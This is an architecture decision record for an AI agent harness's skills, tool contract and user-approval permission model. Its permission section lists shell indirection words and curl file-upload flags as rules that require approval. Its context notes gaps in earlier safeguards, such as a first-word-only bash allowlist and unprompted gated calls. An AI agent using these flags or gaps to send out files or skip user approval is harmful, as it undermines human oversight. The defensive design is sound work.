# ADR-0156: Skills and Tools Follow the Industry Standard — Agent Skills Folders Chosen by the Model, One Tool Contract, and One Permission Model That Asks the User

**Status:** Accepted — the owner decided every item on 2026-10-10. Amended 2026-10-10 (FRE-1583), 2026-10-11 (FRE-1585) and 2026-10-12 (FRE-1591, and twice for FRE-1594); see Status Updates.
**Date:** 2026-10-10
**Deciders:** Owner (the directive, and an answer to each brief item, 2026-10-10), `master` (the commission, the production checks, the relay), `adr` seat at Opus 5.5 (author)
**Tags:** skills, tools, permissions, approvals, workers, governance, evaluation

**Umbrella:** FRE-1573. **Amends:** ADR-0063 Amendment A, rows A3 (D8.4), A4 (D9.3) and A5 (D8), recorded as ADR-0063 Amendment B. **Keeps:** ADR-0028's tier order.

---

## Context

### The directive

The owner, on FRE-1573:

- "Full stop on skills/tools. We move to the industry standard."
- "Skills/tools are broken. We must move to the industry standard. We stop testing until this is completed. All skills converted and the usage implemented."
- "We are chasing a problem that is broken at its root."
- On approvals: "We should apply the same functionality as the major harnesses. Let the user accept or deny."

Model testing is stopped until the gate in D10 passes.

### The evidence

The FRE-1517 audit (`docs/research/2026-10-10-fre-1517-tool-call-efficiency.md`, PR #1242) measured our tools and skills, not the models.

- **Fixable calls.** On Flash-Next, 55 of 151 calls (36%) in s2_tool and 65 of 144 calls (45%) in s3_logs_learning had a cause in a tool, skill, instruction, policy or the environment (G2).
- **Skills (G4).** Of 23 skills, 5 state how to check a result and 9 state what to do on a failure.
- **Keyword routing is a substring test** (`orchestrator/skills.py:389`). "logic" loads `query-elasticsearch`, and "Spanish" loads `query-tempo`.
- **No real progressive disclosure (G6).** Whole bodies are inlined, up to 8,192 tokens. The `bash` body is in every turn.
- **The hint loop (G6).** 366 of 438 tool results carried "[hint: skill X is available — call read_skill…]". The model called `read_skill` 2 times.
- **Tools (G5).** No edit tool exists. No tool shares an error shape. An error from the tool execution layer is cut to 150 characters before the model sees it (`orchestrator/tool_dispatch.py:304`).
- **Wrong telemetry.** A tool that returns an error dict is logged with `success=True` (`tools/executor.py:620-637`).
- **Permissions.** The bash allowlist checks only the first word (FRE-1572). An allowlist refusal tells the model only `approval_connection_lost` (G5). `run_python` with `network: true` needs no approval in NORMAL mode (G7).

### The approval setting in production

- Production runs with `AGENT_APPROVAL_UI_ENABLED=true` (`/opt/seshat/.env` line 627, and `printenv` in the running gateway, checked by master on 2026-10-10).
- The code default is `False` (`config/settings.py:3035`).
- With `False`, a call that needs approval runs without a prompt and logs `approval_ui_disabled_proceeding` (`tools/executor.py:312-320`). ADR-0063 Amendment A row A3 made this an explicit opt-out.

### The standards

Each was read on 2026-10-10. Where a page has no version, the access date is the version.

- **S1 — Agent Skills specification:** https://agentskills.io/specification (no version on the page; accessed 2026-10-10).
- **S2 — Agent Skills client guide:** https://agentskills.io/client-implementation/adding-skills-support (accessed 2026-10-10).
- **S3 — Anthropic Agent Skills docs:** https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview and `/best-practices` (accessed 2026-10-10). The `docs.claude.com` link on the ticket redirects here.
- **S4 — Anthropic, "Writing effective tools for agents":** https://www.anthropic.com/engineering/writing-tools-for-agents (published 2025-09-11).
- **S5 — Anthropic, "Define tools":** https://platform.claude.com/docs/en/agents-and-tools/tool-use/define-tools (accessed 2026-10-10).
- **S6 — Claude Code permissions:** https://code.claude.com/docs/en/permissions (accessed 2026-10-10). The `/iam` link on the ticket redirects to code.claude.com.
- **S7 — Anthropic text editor tool, `text_editor_20250728`:** https://platform.claude.com/docs/en/agents-and-tools/tool-use/text-editor-tool
- **S8 — MCP specification 2026-07-28, tools:** https://modelcontextprotocol.io/specification/2026-07-28/server/tools

The reference `skills-ref` is not a gate: its README says it is "for demonstration purposes only".

### How the decisions were made

The adr seat posted a decision brief on FRE-1573 (2026-10-10 16:41 UTC, addendum 8b at 16:42). The owner answered every item (16:43 and 17:37 UTC):

- items 1–8: "Accept all (Recommended)", including deleting `seshat-delegate`;
- 7b: the primary gets `query_telemetry`: yes;
- item 9: a read-only file grant for the `general` worker;
- item 10: the proposed bounds, and the G2 and G3 runs are allowed as tool measurements while model testing is stopped;
- 8b: "Refuse it (Recommended)": fail closed, and amend ADR-0063 Amendment A row A3.

At the PR gate, the owner answered two more points (FRE-1573, 2026-10-10 18:40 UTC, relayed by master):

- D8.2: `python3`, `awk`, `sed` and `env` ask: "Yes, they ask (Recommended)";
- O1: the three MCP tools that overlap native ones: "Remove the MCP copies (Recommended)".

---

## Decision

### D1 — Skill format and location (S1)

1. Each skill is a folder: `docs/skills/<name>/SKILL.md`, with optional `scripts/`, `references/` and `assets/` (S1). **Amended 2026-10-12 (FRE-1591):** the folder moves to a top-level `skills/<name>/`, and a skill name states an objective. See the amendment in Status Updates.
2. The frontmatter holds `name` and `description`, plus S1's optional `metadata` (a map of string to string). No other top-level field stays (D4).
3. A CI test enforces the S1 rules on every skill:
   - `name`: 1–64 characters, lowercase letters, digits and hyphens, the same as the folder name;
   - `description`: 1–1,024 characters, in the third person (S3);
   - the body: under 500 lines and under 5,000 tokens (S1, S3);
   - every file that the body names exists, one level below the skill folder (S1).
4. **Why the folder layout fixes a real defect.** `Dockerfile.gateway:66-72` copies `docs/skills/` but not `scripts/`. A script under `docs/skills/<name>/scripts/` ships in the gateway image with no Dockerfile change.

### D2 — The model chooses the skill (S2)

1. The catalog is in the cached system prompt: one line per skill, with `name` and `description` only (S2, about 50–100 tokens per skill).
2. The model loads a body with `read_skill` (D3). The `name` parameter is an enum of the valid skill names (S2).
3. These are deleted:
   - the keyword routing (`orchestrator/skills.py:389`) and the `keywords` field;
   - the hint loop (`orchestrator/tool_dispatch.py:280-298`);
   - the Haiku skill router (`skill_routing_mode`, `skill_routing_model_key`, `orchestrator/executor.py:6674-6714`);
   - the `bash` body that every turn carries today.
4. A loaded skill body is never pruned from the context of its turn (S2, step 5).
5. **Standard, quoted:** "Most implementations rely on the model's own judgment as the activation mechanism, rather than implementing harness-side trigger matching or keyword detection" (S2).
6. **Risk:** a small model can fail to load a skill that it needs. D10 G2 measures this. A fallback is added only if G2 fails.

### D3 — `read_skill(name, path?)` gives detail on demand (S2)

1. With no `path`, `read_skill` returns the body and a list of the skill's files. It does not read those files (S2: the tool lists the resources but "should not eagerly read them").
2. With a `path`, it returns that one file of that skill. It refuses any path outside the skill folder.
3. It works for the primary and for every worker type, with no filesystem access. S2: "Register a tool (e.g., activate_skill) … This is required when the model can't read files directly".

### D4 — The custom frontmatter fields

| Field today | Target |
|---|---|
| `when_to_use` | Merged into `description`. S1 defines it as "what the skill does and when to use it" |
| `keywords` | Deleted (D2) |
| `nudge` | Moved into the body |
| `canonical_patterns` | Moved into the body. No code reads it |
| `tools` | Becomes `metadata.requires-tools`, a comma-separated list. It filters the catalog per agent (D9). It never routes and never blocks |
| `known_bad_patterns` | Leaves the skills. Each of the 10 patterns becomes a deny rule on its tool with its reason (D8), or is dropped with a stated reason |

**Why `known_bad_patterns` goes.** Today the patterns act as a global bash blocklist, also when the skill is not loaded (`orchestrator/tool_dispatch.py:168-224`). The test is a substring test (`:195`). `self-telemetry`'s pattern `"from personal_agent"` blocks a `grep`, but its reason is about `run_python`.

### D5 — How every skill is converted

1. **Every agent skill gets a success section and a recovery section.** The success section states how to check the result. The recovery section states what to do on each failure, with a stop rule. `mermaid-diagrams` is the model to copy (G4).
2. **Every agent skill gets at least 3 evaluation scenarios** in `docs/skills/<name>/evals.yaml`. S3: "Create evaluations BEFORE writing extensive documentation." D10 G2 uses these scenarios.
3. **A body over the D1 limits is split into `references/`.** Today: `query-elasticsearch` (532 lines) and `artifact-design` (about 5,600 tokens).
4. **Fragile command sequences move into tested `scripts/`,** each with `--help` and plain error text (S1, S3: "Solve, don't defer").
5. **Every command in a body or in `scripts/` passes the permission rules** (D8.7). It comes out allow, or a documented ask.
6. **A skill that only explains one tool becomes that tool's description, and the skill is deleted.** S5: descriptions are "by far the most important factor in tool performance".
7. **The 4 `seshat-*` skills are for external agents.** They leave the agent's catalog. `seshat-delegate` is deleted (it says "Works Now: Nothing"). The other 3 move to `docs/external-skills/<name>/SKILL.md` in the S1 format.
8. **Two files are not skills.** `EMPIRICAL_TEST_RESULTS.md` moves to `docs/research/`. `SKILL_TEMPLATE.md` is replaced by an S1 template with the D5.1 sections and an `evals.yaml` example.

The migration table gives the verdict for each file.

### D6 — One tool contract (S4, S5, S8)

1. **One result shape.** On success: `{ok: true, ...}`. On failure: `{ok: false, error: {code, message, retryable, next_action}}`.
   - `code` is a stable string from a closed set per tool.
   - `next_action` tells the model the next call that can work, or says that none exists.
   - The shape maps onto S8: a tool execution error is a result with `isError: true` that carries "actionable feedback that language models can use to self-correct".
2. **The 150-character clip is removed** (`orchestrator/tool_dispatch.py:304`). An error message is bounded at 2,000 characters. Then a refusal keeps its fix, for example the allowed fields of `query_telemetry`.
3. **A failure is recorded as a failure.** A result with `ok: false` logs `success: false` on `tool_call_completed`.
4. **Every result has a size bound.** A result over its bound is truncated with text that names the next call, as `read` does today. No result exceeds 25,000 tokens (S4: "For Claude Code, we restrict tool responses to 25,000 tokens by default").
5. **Every description follows S5:** "at least 3–4 sentences", what the tool does, when to use it and when not, what each parameter means, and its limits. It holds 1–3 example calls in the text.
   - `input_examples` (S5) is an Anthropic API field. The default primary runs on llama.cpp, so the examples go in the description text.
6. **MCP tools** keep their transport. The MCP client maps `isError: true` and the error text onto the D6.1 shape. After D7.5, no MCP server is enabled. The mapping stays in the client, for a later server that ADR-0028 justifies.

### D7 — The tool set (S4, S7)

1. **An `edit` tool is added.** It replaces one exact string in one file. Zero matches or more than one match is an error that gives the count (S7: "ensure that there is exactly one match … or provide appropriate error messages"). It has the path governance of `write`. Evidence: 13 calls (G3 #6).
2. **The primary gets `query_telemetry`.** The tool loses `worker_only=True` (`tools/telemetry_query.py:470`). Evidence: 42 primary calls of `bash` + `curl` against a stale skill (G3 #1a). **Amended 2026-10-12 (FRE-1591):** the tool splits into `search_logs` and `measure_model_latency`. The primary sees each one only after it loads a skill that provides it. See the amendment in Status Updates.
3. **No new MCP server.** ADR-0028's tier order stays: native, then CLI with a skill, then MCP. We copy S8's tool shape, not its transport.
4. **A narrow tool replaces a shell recipe** where the audit shows repeated shell work. `query_telemetry` (D7.2) is the first case. No other case is decided here.
5. **The MCP copies of native tools are removed (owner, 2026-10-10).** `mcp_query-docs` and `mcp_resolve-library-id` copy `get_library_docs` (Context7), and `mcp_sequentialthinking` copies the `sequential-thinking` skill. S4 warns against overlapping tools.
   - The `context7` and `sequentialthinking` servers leave the MCP server set (`DEFAULT_SERVERS` in `docker/mcp/run-gateway.sh:33`).
   - No MCP server remains, so the MCP gateway is turned off: `mcp_gateway_enabled` is false. Production sets `AGENT_MCP_GATEWAY_ENABLED=true` today (`.env` line 222). Master changes it at the deploy of T3, because master owns the production `.env`.
   - `get_library_docs` and the `sequential-thinking` skill stay.

### D8 — One permission model (S6)

1. **Rules.** Governance holds `deny`, `ask` and `allow` lists of `Tool(pattern)` rules for every tool. The order is "deny, then ask, then allow. The first match in that order determines the outcome" (S6). Mode-specific rules from `config/governance/tools.yaml` stay, as rules scoped to a mode.
   - **The pattern grammar.** For `Bash`, `Bash(<words>)` matches a subcommand whose argument list equals `<words>`, and `Bash(<words> *)` matches one whose argument list starts with `<words>`. For every other tool, `Tool(p1=v1, p2=v2 …)` matches a call only if every named parameter matches, each with the same exact or `*` prefix forms. Parameters that the pattern does not name are free. A session rule (D8.3) uses the complete form `Tool(=<arguments>)`: it matches only a call whose full argument set, as canonical JSON, is equal. T2 writes the grammar into `config/governance/` with a test per form.
   - **The rules fail closed.** If the rules cannot be loaded, or the evaluation of a call raises an error, the call is denied with a D6 error. A tool with no rule at all, and a call that matches no rule, ask (D8.3). Nothing runs by default.
   - This replaces the fail-open branches of the path check: `_check_path_governance` returns "permitted" on a load error and on a missing policy (`tools/primitives/_governance.py:168-176`). After T2, a load error denies.
2. **Bash.** A command is split on "`&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand independently" (S6). Deny and ask rules also apply to a command inside a subshell, a command substitution or a control-flow body (S6). FRE-1572's splitter becomes this matcher. The `auto_approve_prefixes` lists become allow rules. Where S6 leaves the parsing open, these rules apply:
   - The command is parsed with a shell parser, not split on text. Quotes and escapes are resolved before a subcommand is matched.
   - **A subcommand can match an allow rule only if all of these hold.** Every other subcommand asks. This is a closed condition, not a list of known tricks:
     - the parser classifies it as a simple command;
     - every word of it is a literal after quote removal: no parameter, arithmetic or command expansion, and no glob;
     - its first word is not an indirect-execution word: `eval`, `source`, `.`, `exec`, `command`, `builtin`, `env`, `nohup`, `timeout`, `nice`, `stdbuf`, `time`, `sudo`, `xargs`, or a shell (`bash`, `sh`, `zsh`, `dash`) with `-c`;
     - no argument is `-exec`, `-execdir`, `-ok` or `-okdir`;
     - no variable assignment stands in front of it (for example `PATH=/x ls`);
     - it has no redirection, except output or errors to `/dev/null` and `2>&1`. An input redirection from a file asks, because it feeds a local file to the command.
   - A command that the parser cannot parse fully asks.
   - A function definition, a heredoc, and process substitution (`<(…)`, `>(…)`) are not simple commands, so they ask.
   - An indirect-execution word can be allowed only by an allow rule whose pattern names the word and the full inner command, for example `Bash(timeout 30 git status)`. A rule of the form `Bash(<indirect word> *)` is rejected when the rules load. **Amended 2026-10-11 (FRE-1585):** one prefix form of `python3` loads, for a reviewed skill script. See the amendment in Status Updates.
   - **Migrating `auto_approve_prefixes` is not a copy.** A prefix that can run another program does not become an allow rule: today's list holds `env`, `awk`, `sed` and `python3` (`config/governance/tools.yaml:648-691`). They ask. This is the owner's decision of 2026-10-10 (FRE-1573, 18:40 UTC: "Yes, they ask"). It reverses the owner's earlier choice in the FRE-1572 build seat that `python3` stays auto-approved. `curl` stays allowed only when no argument sends a local file (`-d @…`, `--data*` with `@`, `-F …=@…`, `-T`, `--upload-file`, `-K`, `--config`). Otherwise it asks. T2 lists every prefix of today with its outcome in the PR. **Amended 2026-10-10 (FRE-1583):** `curl` runs without asking only for a listed read of internal telemetry. See the amendment in Status Updates.
3. **No match asks the user.** The approval card (FRE-1461, ADR-0063 Amendment A) shows the tool, the exact arguments, and the worker when a worker asks. The card offers "allow once" and "allow for this session".
   - "Allow for this session" adds a session allow rule for the exact tool and arguments of the call.
   - It is offered only when the call asks because no rule matched. A call that matches an explicit `ask` rule (for example `run_python` with `network: true`) offers "allow once" only. The order of D8.1 holds: an explicit ask rule is never overridden by an allow rule.
4. **No approval surface: deny (amends ADR-0063 Amendment A row A3).** An "ask" call is denied, never run, in each of these cases:
   - the turn has no PWA client (as row A2);
   - the layer has no transport or no session id (as row A2);
   - **`approval_ui_enabled` is `False`.** This replaces row A3. The log event becomes `approval_ui_disabled_denied`.

   The model gets a D6 error with the refused subcommand and the rule that refused it, not `approval_connection_lost`. Standard: S6's `dontAsk` mode "Auto-denies every call that would otherwise prompt". In S6 only a mode chosen by name removes prompts. A default value never does. The owner approved this amendment on FRE-1573 (2026-10-10 17:37 UTC).
5. **The eval stack needs explicit rules.** Row A3 said the eval stack sets the flag false on purpose (FRE-1505). After D8.4, the eval stack lists the calls that it runs as allow rules in its own rules file. No default turns prompts off.
6. **`run_python` with `network: true` is an ask rule in every mode.** Evidence: G7.
7. **CI test.** Every command in a skill body or a skill script is evaluated against the rules. It must come out allow, or an ask that the skill documents.
8. **Order.** FRE-1572 ships first, as the live fix.

### D9 — Workers

1. **Each worker type gets a catalog** of the skills whose `metadata.requires-tools` that type holds. A filtered skill is hidden (S2: "Hide filtered skills entirely").
2. **Every worker type gets `read_skill`,** the researcher too. `read_skill` reads only the bundled skill files, not private data, so FRE-1564's outbound/private split holds.
3. **Worker calls pass through the D8 rules.** An "ask" goes to the same card, per call, with the exact arguments and the worker named (brief item 9). This replaces row A4's "once per tool per turn" for ask rules, and it answers FRE-1565's scope item 2. The `operator` type and worker bash as `nobody` in its own workspace (FRE-1565) are unchanged.
4. **Read-only file grant (owner, 2026-10-10).** The `general` worker may `read` the files that its task names. It may not write them. The `general` worker holds private reads and no outbound tool, so the FRE-1564 split holds. The grant works by these rules:
   - The task spec carries a structured field `read_paths`: a list of absolute file paths. Paths in the task text grant nothing.
   - A directory grants nothing, and a glob grants nothing. Each entry names one regular file.
   - At grant time, each path is resolved to its real path, and the file's device and inode numbers are recorded. A path that does not resolve to a regular file is dropped from the grant, with a log event.
   - At read time, two checks must both pass. First, the real path of the requested path must equal a recorded real path. Second, `read` opens the file and the opened file's device and inode numbers must equal the recorded ones. A mismatch in either is refused with a D6 error. The first check refuses a hard link at another path. The second check refuses a file that was replaced after the grant, including by a symlink.
   - The path must also pass the read tool's path governance. The grant never widens it.
   - The grant ends with the task.

### D10 — The gate that resumes model testing

Model studies (FRE-1517 and its successors) resume only when every implementation ticket of this ADR is Done and all four checks pass. The owner set the bounds on 2026-10-10.

| Check | Measure | Bound |
|---|---|---|
| **G1 Conformance** | CI: every skill passes the D1 validator, and every registered tool returns the D6 shape on each of its error paths | 100% |
| **G2 Skill choice** | The production primary model on every D5.2 scenario, plus 20 prompts that need no skill | Right skill loaded ≥ 90% of scenarios. A skill loaded on ≤ 10% of the no-skill prompts |
| **G3 Fixable calls** | The PR #1242 audit re-run on the same s2_tool and s3_logs_learning scripts, with the same model (Flash-Next), the same `DEFINITIONS.md`, and a hand check of the same size (39 rows) | Fixable share ≤ 15% in each session (baseline 36% and 45%) |
| **G4 Prompt cost** | First-call prompt tokens per turn, median over the G3 runs | Not above the median of the baseline sessions `860d7435` and `514a039b` |

- The G2 and G3 runs are tool measurements, allowed by the owner while model testing is stopped. They run on the eval stack, never on production substrate (FRE-375).
- The G4 baseline is computed from stored data and recorded on the gate ticket before the run.
- A change of model, script or bound needs the owner's approval before the run.

---

## Migration table

Each row has a target state and the ticket that delivers it. The tickets T1–T9 are listed in the Implementation Notes, with their Linear ids (T1 is FRE-1572, T2–T9 are FRE-1574 to FRE-1581, project P-FRE-49).

### Every file in `docs/skills/` (25 files)

| File | Lines | Target | Ticket |
|---|---|---|---|
| `artifact-design.md` | 453 | **Convert.** Split the body (about 5,600 tokens) into `SKILL.md` and `references/` per library | T5 (layout), T7 (content) |
| `bash.md` | 120 | **Fold into the `bash` description, then delete.** Keep: where commands start, absolute paths, how ask and deny work | T3 (fold), T5 (delete) |
| `fetch-url.md` | 110 | **Fold into the `fetch_url` description, then delete.** It teaches `curl` as a fallback for a native tool | T3, T5 |
| `get_location.md` | 124 | **Fold into the `get_location` description, then delete** | T3, T5 |
| `infrastructure-health.md` | 98 | **Convert.** The `psql "$(…)" -c` probe moves into a tested script that passes the rules | T5, T6 |
| `list-directory.md` | 137 | **Fold one line (`find … \| wc -l` to count) into the `bash` description, then delete** | T3, T5 |
| `mermaid-diagrams.md` | 391 | **Convert.** The `mmdc` validation moves into `scripts/` | T5, T7 |
| `neo4j-direct.md` | 138 | **Convert.** The Cypher call moves into `scripts/` | T5, T6 |
| `personal-history-recall.md` | 135 | **Fold the "we/I/my → this tool, else `search_memory`" rule into the `recall_personal_history` and `search_memory` descriptions, then delete** | T3, T5 |
| `query-elasticsearch.md` | 532 | **Convert.** Leads with `query_telemetry`. Split into `SKILL.md` and `references/`. Builds on FRE-1568's content fix | T5, T6 |
| `query-tempo.md` | 314 | **Convert.** Builds on FRE-1568's model-call recipe | T5, T6 |
| `read-write.md` | 134 | **Fold into the `read`, `write` and `edit` descriptions, then delete** | T3, T5 |
| `run-python.md` | 82 | **Fold into the `run_python` description, then delete.** Keep: no state between calls, network is an ask | T3, T5 |
| `self-telemetry.md` | 298 | **Convert.** Leads with `query_telemetry`. ES recipes shared with `query-elasticsearch` are linked, not copied | T5, T6 |
| `sequential-thinking.md` | 103 | **Convert** (an instruction skill with no tool) | T5, T7 |
| `seshat-delegate.md` | 64 | **Delete** (owner, 2026-10-10) | T5 |
| `seshat-knowledge.md` | 108 | **Move** to `docs/external-skills/seshat-knowledge/SKILL.md`, S1 format, out of the agent catalog | T5 |
| `seshat-observations.md` | 186 | **Move** to `docs/external-skills/seshat-observations/SKILL.md` | T5 |
| `seshat-sessions.md` | 100 | **Move** to `docs/external-skills/seshat-sessions/SKILL.md` | T5 |
| `system-diagnostics.md` | 85 | **Convert** | T5, T6 |
| `system-metrics.md` | 121 | **Convert** | T5, T6 |
| `turn-forensics.md` | 150 | **Convert** | T5, T6 |
| `web-search.md` | 94 | **Fold into the `web_search` description, then delete.** Keep: real-world facts go here, not to `search_memory`, and what `categories` returns | T3, T5 |
| `EMPIRICAL_TEST_RESULTS.md` | 193 | **Move** to `docs/research/` (not a skill) | T5 |
| `SKILL_TEMPLATE.md` | 88 | **Replace** with an S1 template (D5.8) | T5 |

Result: 11 agent skills, 3 external skills, 8 skills folded into tool descriptions, 1 deleted.

### Every tool that the gateway can register (28 rows: 26 registered in production, 1 conditional, 1 new)

Source: `tools/__init__.py:86-183`, and the startup log of the running gateway on 2026-10-10 (`mcp_tools_discovered count=3`, `primitive_tools_registered count=5`, `location_tool_registered`, `notes_tools_registered`, `artifact_tools_registered`). Every tool also gets its D8 rules (T2) and the D6 contract (T3). The table names the changes beyond that.

| Tool | Target beyond D6 and D8 | Ticket |
|---|---|---|
| `search_memory` | Description takes the "shared graph, not your own history" rule | T2, T3 |
| `recall_personal_history` | Description takes the `personal-history-recall` skill | T2, T3 |
| `web_search` | Description takes the `web-search` skill and states what `categories` returns | T2, T3 |
| `perplexity_query` | Contract only | T2, T3 |
| `get_library_docs` | Contract only | T2, T3 |
| `fetch_url` | Description takes the `fetch-url` skill | T2, T3 |
| `query_telemetry` | Registered for the primary (D7.2). Refusals keep the allowed fields (D6.2) | T2, T3, T4 |
| `create_linear_issue` | Ask rule (a write) | T2, T3 |
| `find_linear_issues` | Contract only | T2, T3 |
| `list_linear_projects` | Contract only | T2, T3 |
| `create_linear_project` | Ask rule (a write) | T2, T3 |
| `notes_write` | Contract only | T2, T3 |
| `notes_search` | Contract only | T2, T3 |
| `artifact_write` | Contract only. `TerminalToolError` maps onto D6.1 | T2, T3 |
| `artifact_list` | Contract only | T2, T3 |
| `artifact_read` | Contract only | T2, T3 |
| `artifact_draft` | Contract only | T2, T3 |
| `get_location` | Description takes the `get_location` skill | T2, T3 |
| `read` | `general` worker read-only grant on task-named paths (D9.4). Description takes `read-write` | T2, T3, T8 |
| `write` | Description takes `read-write` | T2, T3 |
| `bash` | Per-subcommand rules (D8.2), on FRE-1572. Description takes `bash` and `list-directory` | T2, T3 |
| `run_python` | `network: true` is an ask rule (D8.6). Description takes `run-python` | T2, T3 |
| `read_skill` | Rewritten as `read_skill(name, path?)` with an enum (D3) | T5 |
| `mcp_query-docs` | **Remove** (D7.5). `get_library_docs` stays | T3 |
| `mcp_resolve-library-id` | **Remove** (D7.5). `get_library_docs` stays | T3 |
| `mcp_sequentialthinking` | **Remove** (D7.5). The `sequential-thinking` skill stays | T3 |
| `expand_tool_result` | **Not registered in production** (see below). Contract only, and the AC-1 test covers it | T2, T3 |
| `edit` | **New** (D7.1). Built on the contract and the rules from the start | T4 |

**Not registered in production:** `expand_tool_result` registers only with `tool_result_compression_enabled`, which is off (ADR-0085 is parked). It stays in the table and in the AC-1 test, so that it conforms if it returns. The `mcp_browser_*` entries in `tools.yaml` have governance rows, but the gateway did not discover those tools.

**O1, decided (owner, 2026-10-10 18:40 UTC):** "Remove the MCP copies". The three MCP tools that overlap native ones are removed (D7.5). After T3, the gateway can register 25 tools: the 28 rows minus the 3 removed.

---

## Alternatives Considered

### Option 1: Keep the flat files and add fields (brief item 1B)

**Description:** keep `docs/skills/<name>.md` and add the missing fields.

**Pros:** no file moves, and fewer reader changes.

**Cons:** scripts still do not ship in the gateway image. The files do not match S1, so no S1 client or validator can read them.

**Why Rejected:** the owner asked for the industry standard. The folder layout is the standard and fixes the image defect.

### Option 2: Keep harness routing, on whole words (brief items 2B, 2C)

**Description:** keep `hybrid` mode, or keep keyword routing with whole-word matches as a fallback.

**Pros:** a small model gets a skill even when it does not choose one.

**Cons:** routing inlines whole bodies (G6) and fires on unrelated words (G4). Whole-word matches still fire on "model" and "draw". S2 says most implementations rely on the model's own judgment.

**Why Rejected:** G2 measures whether the model chooses well. A fallback is added only if G2 fails.

### Option 3: Fix only the clip and the messages (brief item 6B)

**Description:** remove the 150-character clip and rewrite the worst error texts.

**Pros:** small and fast.

**Cons:** the telemetry stays wrong (`success: True` on an error), and no tool tells the model whether to retry.

**Why Rejected:** S4 and S8 define errors as actionable feedback. One shape is the only way to test every error path (G1).

### Option 4: FRE-1572 only, with the per-tool rules unchanged (brief item 8B)

**Description:** close the bash bypass and keep each tool's own rules.

**Pros:** the live hole closes with the least change.

**Cons:** `run_python` network stays unasked, refusals stay opaque, and each tool keeps its own partial model.

**Why Rejected:** the owner asked for the major harnesses' model: "Let the user accept or deny".

### Option 5: Keep row A3 and record the risk (brief item 8B, option B)

**Description:** `approval_ui_enabled = False` keeps running "ask" calls without a prompt.

**Pros:** the eval stack needs no rules file.

**Cons:** a deployment that does not set the flag runs every gated call unasked. The code default is `False`.

**Why Rejected:** the owner chose to fail closed. In S6 only a named mode removes prompts.

### Option 6: Workers get no skills, and file tasks stay on the primary (brief item 9B)

**Description:** workers keep no catalog, and a worker never reads a task file.

**Pros:** the smallest worker surface.

**Cons:** 21 worker calls searched for a file that they could not open (G3 #2). A worker without a skill repeats the primary's errors.

**Why Rejected:** the owner chose the read-only file grant.

---

## Consequences

### Positive Consequences

- A skill loads when the model asks for it. Unrelated words load nothing.
- Every refusal and every error tells the model what to do next.
- Telemetry counts a failed call as a failure.
- One rule set decides every call of the primary and every worker, and the user decides every "ask".
- A deployment that forgets the approval flag is closed, not open.
- Skill scripts ship in the gateway image.

### Negative Consequences

- The skill loader, the prompt assembly, and the 18 files that read `docs/skills/` today change in one ticket (T5).
- The primary's prompt gets the `query_telemetry` and `edit` descriptions on every turn. G4 bounds the total.
- The eval stack needs its own allow rules before its next run (D8.5).
- A harness turn denies more calls than today. It still denied most of them under row A2.

### Risks and Mitigations

| Risk | Severity | Mitigation |
|---|---|---|
| A small primary model does not load a skill that it needs | High | G2 measures it. A fallback is added only if G2 fails |
| The eval stack breaks after D8.4 | Medium | T2 ships the eval rules file in the same change |
| A rule set that is too strict floods the owner with cards | Medium | The allow rules start from today's `auto_approve_prefixes`. "Allow for this session" adds a rule |
| G3 cannot re-run with Flash-Next | Medium | The gate ticket stops and asks the owner. No silent model change |
| FRE-1568 and T6 edit the same two skills | Low | T6 is blocked by FRE-1568 |

---

## Implementation Notes

### The tickets, in order

| # | Ticket | Delivers | Blocked by |
|---|---|---|---|
| T1 | FRE-1572 (exists) | The live bash bypass fix. Its splitter becomes D8.2's matcher | — |
| T2 (FRE-1574) | Permission model | D8 (including the fail-closed load and the bash parser rules), D4 (`known_bad_patterns` to deny rules), the eval rules file | T1 |
| T3 (FRE-1575) | Tool contract | D6, the 8 skills folded into descriptions (D5.6), and the MCP copies removed (D7.5) | T2 |
| T4 (FRE-1576) | `edit` tool, and `query_telemetry` for the primary | D7.1, D7.2 | T3 |
| T5 (FRE-1577) | Skill loader and layout | D1, D2, D3, D4, D5.7, D5.8: every file moved, deleted or replaced | T3 |
| T6 (FRE-1578) | Conversion: telemetry and host skills | D5.1–D5.5 for 8 skills | T4, T5, FRE-1568 |
| T7 (FRE-1579) | Conversion: authoring skills | D5.1–D5.5 for `artifact-design`, `mermaid-diagrams`, `sequential-thinking` | T5 |
| T8 (FRE-1580) | Workers | D9 | T5 |
| T9 (FRE-1581) | Gate run | D10 | T6, T7, T8 |

T4 comes before T6 so that the telemetry skills can lead with `query_telemetry`. The owner's brief order put the tools after the conversion. This order avoids writing those skills twice.

### Code that changes (indicative, each ticket names its own)

- `orchestrator/skills.py`, `orchestrator/tool_dispatch.py`, `orchestrator/prompts.py`, `orchestrator/executor.py` (skill routing), `orchestrator/sub_agent.py` (worker catalogs).
- `tools/read_skill.py`, `tools/executor.py`, `tools/telemetry_query.py`, every tool definition.
- `config/governance/tools.yaml`, `config/settings.py` (the skill routing settings go).
- `docs/reference/TOOL_INTEGRATION_GUIDE.md` (the Tier 2 skill format).

### Not in scope

- FRE-226 (self-updating skills). The S1 format allows it later.
- The search backend (G3 #3) and overlapping research (G3 #4). They are not tool or skill defects.
- An egress-only sandbox network (G7). Master holds it for the owner.

---

## Verification / Acceptance Criteria

These are the ADR's own criteria. They are adjudicated on FRE-1573 after T1–T9 are Done and deployed. AC-1 to AC-4 are the D10 gate.

- **AC-1 — every skill and every tool conforms (G1).** **Check:** three CI tests.
  - **Skills.** The D1 validator runs over `docs/skills/*/SKILL.md` and `docs/external-skills/*/SKILL.md`. It asserts:
    - exactly the 11 agent skills and the 3 external skills of the migration table;
    - a success section and a recovery section in each agent skill (D5.1);
    - an `evals.yaml` with at least 3 scenarios in each agent skill (D5.2);
    - that every command in a body or a script comes out allow, or an ask that the skill documents, under the D8 rules (D8.7).
  - **Tools.** A contract test builds the registry with every registration flag on, so that conditional tools are included. It fails if the registry differs from the 25 rows of the migration table that are not removed, or if a removed tool is registered. For each tool it asserts:
    - the success shape and the failure shape of D6.1;
    - a failure can only be built from the tool's error-code type, so an undeclared code cannot be returned (a type check, not a declaration that the test trusts);
    - every line that builds a failure is executed by a test, shown by a coverage report over those lines. One test per code is not enough when several paths share a code;
    - a result over the tool's bound is truncated with next-call text, and no result exceeds 25,000 tokens (D6.4);
    - the description has at least 3 sentences and at least 1 example call (D6.5).
  - **Dispatch.** The failure paths outside the tools give the D6.1 shape: an unknown tool, a missing parameter, a governance refusal, a permission deny, a timeout and an exception in the executor.

  *Fails if* any assertion fails. Seeded negatives: a skill with a 1,025-character `description` fails the validator, and a tool that returns a plain error dict fails the contract test.
